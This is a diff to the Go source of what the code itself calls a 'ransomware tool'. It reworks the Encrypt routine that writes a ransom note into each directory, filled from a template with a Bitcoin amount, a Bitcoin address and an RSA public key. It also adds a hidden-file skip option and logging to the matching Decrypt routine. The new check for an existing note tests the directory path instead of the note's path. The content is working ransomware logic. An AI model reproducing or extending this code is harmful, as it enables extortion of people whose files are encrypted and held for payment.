@@ -142,53 +142,53 @@ func Encrypt(ctx *urfavecli.Context) error {
 			if addRansom {
 				ransomPath := filepath.Join(path, ransomFileName)
 
-				if fs.Exists(ransomPath) {
-					return nil
+				if _, err := os.Stat(path); errors.Is(err, os.ErrNotExist) {
+					// Ransom file does not exist
+
+					if ransomTemplatePath == "" {
+						return errors.New("if you want to add a ransom you must provide a templatePath")
+					}
+
+					templateAbsPath, err := filepath.Abs(ransomTemplatePath)
+
+					if err != nil {
+						return err
+					}
+
+					template, err := template.ParseFiles(templateAbsPath)
+
+					if err != nil {
+						return err
+					}
+
+					textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
+
+					if err != nil {
+						return err
+					}
+
+					file, err := os.Create(ransomPath)
+
+					if err != nil {
+						return err
+					}
+
+					defer file.Close()
+
+					writer := bufio.NewWriter(file)
+
+					err = template.Execute(writer, &Ransom{
+						BitcoinCount:   float32(bitcoinCount),
+						BitcoinAddress: bitcoinAddress,
+						PublicKey:      textPublicKey,
+					})
+
+					if err != nil {
+						return err
+					}
+
+					writer.Flush()
 				}
-
-				if ransomTemplatePath == "" {
-					return errors.New("if you want to add a ransom you must provide a templatePath")
-				}
-
-				templateAbsPath, err := filepath.Abs(ransomTemplatePath)
-
-				if err != nil {
-					return err
-				}
-
-				template, err := template.ParseFiles(templateAbsPath)
-
-				if err != nil {
-					return err
-				}
-
-				textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
-
-				if err != nil {
-					return err
-				}
-
-				file, err := os.Create(ransomPath)
-
-				if err != nil {
-					return err
-				}
-
-				defer file.Close()
-
-				writer := bufio.NewWriter(file)
-
-				err = template.Execute(writer, &Ransom{
-					BitcoinCount:   float32(bitcoinCount),
-					BitcoinAddress: bitcoinAddress,
-					PublicKey:      textPublicKey,
-				})
-
-				if err != nil {
-					return err
-				}
-
-				writer.Flush()
 			}
 		}
 
@@ -218,6 +218,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 	log.Println("RSA private key loaded")
 
 	dryRun := ctx.Bool("dryRun")
+	skipHidden := ctx.Bool("skipHidden")
 	encSuffix := ctx.String("encSuffix")
 	ransomFileName := ctx.String("ransomFileName")
 	extWhitelist := []string{encSuffix}
@@ -226,6 +227,7 @@ func Decrypt(ctx *urfavecli.Context) error {
 	log.Printf("DryRun enabled = %t", dryRun)
 	log.Printf("Whitelisted extensions = %v", extWhitelist)
 	log.Printf("Ransom file name = %s", ransomFileName)
+	log.Printf("Skip Hidden = %t", skipHidden)
 
 	absolutePath, err := filepath.Abs(path)
 
@@ -235,7 +237,8 @@ func Decrypt(ctx *urfavecli.Context) error {
 
 	log.Printf("Running ransomware tool on %s", absolutePath)
 
-	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, false, func(path string, info iofs.FileInfo) error {
+	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
+		log.Println("Parsing", path)
 		if !info.IsDir() {
 			err := decryptFile(path, rsaPrivateKey, encSuffix)
 
@@ -251,7 +254,8 @@ func Decrypt(ctx *urfavecli.Context) error {
 				}
 			}
 		} else {
-			fs.DeleteFileIfExists(filepath.Join(path, ransomFileName))
+			ransomPath := filepath.Join(path, ransomFileName)
+			fs.DeleteFileIfExists(ransomPath)
 		}
 
 		return nil
